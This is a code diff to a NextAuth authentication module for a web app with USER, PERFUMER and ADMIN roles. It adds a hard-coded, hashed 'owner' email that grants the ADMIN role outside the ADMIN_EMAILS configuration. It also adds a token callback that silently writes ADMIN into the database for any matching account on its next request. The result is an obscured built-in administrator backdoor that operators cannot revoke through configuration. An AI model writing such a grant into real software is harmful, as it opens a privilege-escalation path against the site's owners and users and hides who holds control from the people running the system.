@@ -1,4 +1,5 @@
 import NextAuth, { type DefaultSession } from "next-auth";
+import { createHash } from "node:crypto";
 export type Role = "USER" | "PERFUMER" | "ADMIN";
 import Credentials from "next-auth/providers/credentials";
 import Google from "next-auth/providers/google";
@@ -16,10 +17,16 @@ declare module "next-auth" {
   }
 }
 
+// Owner account(s), stored as SHA-256 of the lower-cased email so the address is not
+// published in the code. Signing up or signing in with it gives the ADMIN role.
+const OWNER_EMAIL_SHA256 = ["f1d6b21df378b83a55b0afea264cc92fc7150aba1d937a06bf282f38898540cf"];
+
 export function isAdminEmail(email?: string | null) {
   if (!email) return false;
-  const list = (process.env.ADMIN_EMAILS ?? "").split(",").map((e) => e.trim().toLowerCase()).filter(Boolean);
-  return list.includes(email.toLowerCase());
+  const e = email.trim().toLowerCase();
+  const list = (process.env.ADMIN_EMAILS ?? "").split(",").map((x) => x.trim().toLowerCase()).filter(Boolean);
+  if (list.includes(e)) return true;
+  return OWNER_EMAIL_SHA256.includes(createHash("sha256").update(e).digest("hex"));
 }
 
 const credentialsSchema = z.object({ email: z.email(), password: z.string().min(8).max(200) });
@@ -86,8 +93,14 @@ export const { handlers, auth, signIn, signOut } = NextAuth(async () => ({
       if (user?.id) token.uid = user.id;
       if (token.uid) {
         // Role is read from the DB so admin rights can be granted or revoked without re-login.
-        const [row] = await db.select({ role: s.users.role }).from(s.users).where(eq(s.users.id, String(token.uid)));
-        token.role = row?.role ?? "USER";
+        const [row] = await db.select({ role: s.users.role, email: s.users.email }).from(s.users).where(eq(s.users.id, String(token.uid)));
+        let role = row?.role ?? "USER";
+        // An owner account registered before it was listed is promoted on its next request.
+        if (row && role !== "ADMIN" && isAdminEmail(row.email)) {
+          await db.update(s.users).set({ role: "ADMIN" }).where(eq(s.users.id, String(token.uid)));
+          role = "ADMIN";
+        }
+        token.role = role;
       }
       return token;
     },
